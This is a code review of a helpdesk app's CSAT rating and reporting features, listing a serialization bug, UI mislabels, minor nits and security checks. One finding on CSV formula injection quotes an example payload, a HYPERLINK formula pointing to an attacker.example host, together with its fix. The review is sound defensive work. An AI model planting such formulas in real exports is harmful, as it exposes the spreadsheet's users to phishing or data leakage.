## Summary

Server-side Phase-4 work is solid: every report endpoint is manager/admin-gated, `/rate` is owner-scoped and CSRF-protected, all SQL is parameterized, `days` is validated/clamped, and the CSAT migration is idempotent. Live tests confirm the 403/400/404 paths behave exactly as specified.

There is **one genuine functional bug**: the backend never serializes `csat`, so the frontend's promised "shows existing score" feature is dead code and the CSAT widget enters a confusing 400-error loop after a rating. Everything else is low-severity correctness/UX polish.

## TRUE BUGS

### 1. [HIGH] `csat` is never serialized → "shows existing score" broken; widget re-errors after rating

- **File/line:** `app/routes_tickets.py:595-614` (`_serialize`) — the returned dict has no `"csat"` key. Affects both `GET /api/tickets/<id>` and `GET /api/tickets` (list).
- **Evidence (live):**
  - DB truth: `tickets.id=22 → csat=5`, `id=23 → csat=3`.
  - `GET /api/tickets/22` (as owner sam) returns `{"id": 22, "status": "resolved", "csat": null, ...}` — `csat` is `null`/absent even though the DB has a value.
  - Consequently in `static/js/app.js:254-274` (`csatWidget`):
    - `t.csat` is always `null`/`undefined`, so the "already rated → show ★ score" branch (`app.js:260-264`) is **unreachable**.
    - For the owner of a resolved/closed ticket the star buttons (`app.js:265-270`) render on every visit. After the requester rates once (200 OK), `viewTicket(id)` re-renders, the stars reappear, and clicking again → `POST /api/tickets/<id>/rate` returns `400 "Already rated"` → error toast. The Phase-4 feature "shows existing score" does not work and the UI offers an action that always fails on repeat visits.
- **Fix:** add `"csat": t["csat"]` to the `_serialize` return dict in `routes_tickets.py` (this file is not in the phase's changed-file list, but the widget cannot work without it), and pair with bug 2 below.

### 2. [MEDIUM] `csatWidget` mislabels the existing score as "Your rating" for non-owners (latent until #1 is fixed)

- **File/line:** `static/js/app.js:260-264`.
- **Evidence:** `csatWidget(t, isOwner)` returns the "Your rating ★…" block whenever `t.csat != null`, regardless of `isOwner`. `viewTicket` calls it with `isOwner = (role==='requester' && requester_id===user.id)` (`app.js:688`), so once bug #1 is fixed an agent/manager viewing a rated ticket would see "Your rating 3/5" on a ticket they did not rate.
- **Fix:** gate the score block on `isOwner` (render nothing, or a neutral "Requester rating" label, for staff).

### 3. [LOW/MEDIUM] CSV formula injection in `export.csv`

- **File/line:** `app/routes_reports.py:185-193` (`csv.writer` writes `subject` and other fields raw).
- **Evidence:** `subject` is requester-controlled (max 100 chars, set on create). A subject beginning with `=` / `+` / `-` / `@` (e.g. `=HYPERLINK("//attacker.example/x","click")`) is written verbatim into the CSV, and the file is downloaded and opened in Excel by manager/admin. Spreadsheet formula injection.
- **Fix:** prefix any cell starting with `=`,`+`,`-`,`@` with a leading `'` (OWASP mitigation) when writing rows.

## UX / CORRECTNESS NITS (non-blocking)

### 4. [LOW] Reports trend header says "Last N days" but only renders 14 rows
- `static/js/app.js:219-220` — header uses `tr.days` (30 by default) while the body renders `tr.series.slice(-14)`. Misleading. Show "last 14 of 30 days" or render the full window.

### 5. [LOW] Workload average uses a different denominator than the summary average
- `app/routes_reports.py:108-115` — `avg = tot / len(rows) / 3600` divides by all rows even if some timestamps fail `_parse_iso` (those contribute 0 to `tot`), biasing the average low. `_avg_resolution_seconds` (`routes_reports.py:38-41`) correctly divides by the number of successfully parsed rows. Use the parsed count here too for consistency.

### 6. [NIT] "Workload by agent" includes managers/admins
- `app/routes_reports.py:91` — `role IN ('agent','manager','admin')`. Live output lists Admin User and Ops Manager (mostly zero rows). Probably intended to show everyone, but the label and table title say "agent".

### 7. [NIT] `viewReports` has no error state
- `static/js/app.js:194-228` — on any of the 4 parallel API calls failing, only a toast appears and the "Loading reports…" spinner stays on screen. Render an inline error/retry.

### 8. [NIT] `exportCsv()` uses `window.open`
- `static/js/api.js:108` — popup blockers can silently drop the download; and if the session lapsed it opens a tab full of JSON instead of an inline error. Low.

### 9. [NIT] `rate_ticket` nits
- `app/routes_reports.py:204` — `resolved_at` is selected but never used.
- No `helpers.log_activity(...)` entry for a rating (CSAT activity is invisible in the timeline).

### 10. [NIT] `trend()` imports `datetime` inside the function body
- `app/routes_reports.py:164` — move to module-level imports.

### 11. [NIT, pre-existing] Duplicate `kbFeedback` key in api.js
- `static/js/api.js:100-101` — defined twice with identical bodies; the second silently wins. Harmless, but remove one.

### SQL / security notes (checked, no issues)
- Every report/rate query is parameterized (`?` placeholders); `days` is coerced to `int` and clamped before being embedded, so no injection surface.
- `evaluate_on_resolve` (`routes_sla.py:78-96`) sets `breached=1 ⇒ resolution_met=0`, so summary's `met` and `missed` buckets cannot overlap — no double counting in `sla_attainment_pct` or the SLA report.
- CSRF on `/rate` is enforced via `@helpers.csrf_protect` and the client always sends the token through `API.req` (`api.js:35-39`).
- `_migrate` csat guard (`app/db.py:275-277`) is idempotent (`PRAGMA table_info` check before `ALTER TABLE`); fresh installs get `csat INTEGER` straight from `SCHEMA`.
- No requester/agent-visible leakage of report data; export CSV contains numeric IDs only (no names, no password material).
